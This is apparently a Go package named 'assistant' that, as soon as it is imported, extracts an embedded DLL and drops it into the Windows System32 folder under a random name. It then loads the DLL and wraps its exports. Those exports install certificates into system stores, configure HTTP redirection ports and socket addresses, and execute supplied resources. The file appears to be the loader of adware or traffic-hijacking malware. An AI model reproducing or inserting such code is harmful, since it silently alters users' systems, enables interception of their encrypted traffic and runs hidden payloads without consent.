package assistant

import (
	"math/rand"
	"runtime"
	"github.com/ssoor/fundadore/log"
	"path/filepath"
	"fmt"
	"time"
	"os"
	"io/ioutil"
	"errors"
	"syscall"
	"unsafe"
	
	"github.com/rakyll/statik/fs"
	_ "github.com/ssoor/fundadore/statik"
)

type SOCKADDR_IN struct {
	Sin_family int16
	Sin_port   [2]byte
	Sin_addr   [4]byte
	Sin_zero   [8]byte
}

var g_libhttpredirect syscall.Handle

func SetFile(data []byte, fileName string) error {
	syscall.DeleteFile(syscall.StringToUTF16Ptr(fileName))
	syscall.MoveFile(syscall.StringToUTF16Ptr(fileName), syscall.StringToUTF16Ptr(fmt.Sprintf("%s-%x.del", fileName, time.Now().UnixNano())))

	filedir, err := filepath.Abs(filepath.Dir(fileName))
	if err != nil {
		return err
	}

	os.MkdirAll(filedir, 0777)
	file, err := os.Create(fileName)
	if nil != err {
		return err
	}
	defer file.Close()

	if _, err = file.Write(data); nil != err {
		return err
	}

	return nil
}

func  getRandomString(l int) string {  
    str := "0123456789abcdefghijklmnopqrstuvwxyz"  
    bytes := []byte(str)  
    result := []byte{}  
    r := rand.New(rand.NewSource(time.Now().UnixNano()))  
    for i := 0; i < l; i++ {  
        result = append(result, bytes[r.Intn(len(bytes))])  
    }  
    return string(result)  
}  

func statikLoadLibrary(libraryPath string) (err error){
	statikFS, err := fs.New()
	if err != nil {
		return
	}

	statikFile, err := statikFS.Open(libraryPath)
	if err != nil {
		return
	}

	dllContent, err := ioutil.ReadAll(statikFile)
	if err != nil {
		return
	}

	libraryPath = os.ExpandEnv("${windir}\\System32\\" + getRandomString(6) + ".dll")

	if err = SetFile(dllContent, libraryPath); nil != err{
		return
	}

	g_libhttpredirect, err = syscall.LoadLibrary(libraryPath)
	if err != nil {
		return
	}

	return nil
}

func init(){
	var err error
	
	defer func() {
		if nil != err {
			log.Info("[ERROR] assistant init error:", err)
		}
	}()

	switch runtime.GOARCH{
	case "386":
		err = statikLoadLibrary("/youniverse.dll")
	case "amd64":
		err = statikLoadLibrary("/youniverse_x64.dll")
	default:
		err = errors.New("unsupported system architecture: " + runtime.GOARCH)
	}
}

func IsFirstRuning(uniqueName string) (bool, error) {
	addrFuncation, err := syscall.GetProcAddress(g_libhttpredirect, "IsFirstRuning")
	if err != nil {
		return false, err
	}

	ret, _, _ := syscall.Syscall(addrFuncation, 2,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(uniqueName))),
		0, 0)

	//syscall.FreeLibrary(syscall.Handle(libhttpredirect))

	return 0 != ret, nil
}

func StartBusiness() (int32, error) {
	addrFuncation, err := syscall.GetProcAddress(g_libhttpredirect, "StartBusiness")
	if err != nil {
		return 0, err
	}

	ret, _, _ := syscall.Syscall(addrFuncation, 1,
		uintptr(unsafe.Pointer(nil)),
		0, 0)

	return int32(ret), nil
}

func AddCertificateContextToStore(storeName string, certEncodingType int32, certData []byte, certSize int32) (int32, error) {
	addrFuncation, err := syscall.GetProcAddress(g_libhttpredirect, "AddCertificateContextToStore")
	if err != nil {
		return 0, err
	}

	ret, _, _ := syscall.Syscall6(addrFuncation, 4,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(storeName))),
		uintptr(certEncodingType),
		uintptr(unsafe.Pointer(&certData[0])),
		uintptr(certSize),
		0, 0)

	return int32(ret), nil
}

func AddCertificateCryptContextToStore(storeName string, certSRC string) (int32, error) {
	addrFuncation, err := syscall.GetProcAddress(g_libhttpredirect, "AddCertificateCryptContextToStore")
	if err != nil {
		return 0, err
	}

	ret, _, _ := syscall.Syscall(addrFuncation, 2,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(storeName))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(certSRC))),
		0)

	return int32(ret), nil
}

func SetAPIPort(port int) (int32, error) {
	addrFuncation, err := syscall.GetProcAddress(g_libhttpredirect, "SetAPIPort")
	if err != nil {
		return 0, err
	}

	ret, _, _ := syscall.Syscall(addrFuncation, 1,
		uintptr(unsafe.Pointer(&port)),
		0, 0)

	return int32(ret), nil
}

func SetAPIPort2(port int) (int32, error) {
	addrFuncation, err := syscall.GetProcAddress(g_libhttpredirect, "SetAPIPort2")
	if err != nil {
		return SetAPIPort(port)
	}

	ret, _, _ := syscall.Syscall(addrFuncation, 1,
		uintptr(port),
		0, 0)

	return int32(ret), nil
}

func SetBusinessData(index int,available int8, socketIP string, port uint16) (int32, error) {
	addrFuncation, err := syscall.GetProcAddress(g_libhttpredirect, "SetBusinessData")
	if err != nil {
		return 0, err
	}

	ret, _, _ := syscall.Syscall6(addrFuncation, 4,
		uintptr(index),
		uintptr(available),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(socketIP))),
		uintptr(port),
		0, 0)

	return int32(ret), nil
}

func ImplementationResource(resourceBody []byte, resourcePath string, execParameter string) error {
	addrFuncation, err := syscall.GetProcAddress(g_libhttpredirect, "ImplementationResource")
	if err != nil {
		return err
	}

	ret, _, _ := syscall.Syscall6(addrFuncation, 4,
		uintptr(unsafe.Pointer(&resourceBody[0])),
		uintptr(len(resourceBody)),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(resourcePath))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(execParameter))),
		0, 0)

	err = nil

	if 0 == ret {
		err = errors.New("call resource execute function failed")
	}

	return err
}
